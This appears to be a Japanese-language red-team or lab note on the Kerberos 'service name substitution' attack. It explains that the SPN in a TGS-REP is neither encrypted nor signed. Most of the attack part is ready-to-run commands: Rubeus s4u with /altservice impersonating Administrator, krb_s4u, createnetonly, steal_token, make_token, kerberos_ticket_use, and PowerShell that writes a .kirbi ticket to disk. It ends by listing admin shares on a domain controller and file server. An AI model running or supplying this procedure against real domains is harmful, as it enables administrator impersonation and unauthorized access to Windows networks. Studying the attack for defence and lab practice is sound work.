#### Kerberosチケットの構造
#### TGS-REP（サービスチケット）の構造

```
TGS-REP
│
├── [平文] realm          ドメイン名
├── [平文] cname          要求したユーザー名
│
├── ticket                ← サービス側が復号する部分
│   ├── [平文] tkt-vno    バージョン番号
│   ├── [平文] realm      ドメイン名
│   ├── [平文] sname      ← ⚠️ ここが問題のSPN（平文！）
│   └── [🔒暗号化] enc-part ←  サービスアカウントの長期鍵で暗号化
│       ├── セッションキー
│       ├── ユーザー名・グループ情報（PAC）
│       ├── 有効期限
│       └── フラグ
│
└── [🔒暗号化] enc-part   ← クライアント側が復号する部分（ユーザのセッションキーで暗号化
    ├── セッションキー（ticketの中と同じ）
    ├── SPN
    └── 有効期限
```
**sname（SPN）が暗号化も署名もされていない**ことを突いた攻撃

SPNは以下で表せられる
```
サービス名 / ホスト名
例：
CIFS / DC1
TIME / DC1

サービス名 / 完全修飾ドメイン名
例：
TIME / DC1.contoso.com
CIFS / DC1.contoso.com
```

TGS-REPで返されるチケットの暗号化部分は、SPNと紐づいたサービスアカウントを使用して暗号化される。おなじサービスアカウントと紐づいたSPNの場合は、sname部分（SPN）を置き換えることでそのSPNのTGSとして使用することができる。

## アタックケース

### 偵察


### 横展開

### Service Name Substituion
RubeusのS4U機能に`/altservice`パラメータを利用してService Name Substituion可能
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```

or krb_s4uを使用した例
```
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

### チケット悪用（非推奨）
S4Uで取得したTGSを利用
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]RjLTE=
```

```
steal_token <PID>
```

```
ls \\lon-dc-1\c$
```

### チケット悪用（なりすましトークン作成）
ファイルにチケットをかき出し。
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\~.kirbi",[Convert]::FromBase64String("Ticket"))
```

なりすまし用のトークン作成
```
make_token CONTOSO\Administrator FakePass
```

ダンプしたチケットを利用
```
kerberos_ticket_use C:\Users\Attacker\Desktop\~.kirbi
```

FSにアクセス
```
ls \\lon-fs-1\c$
```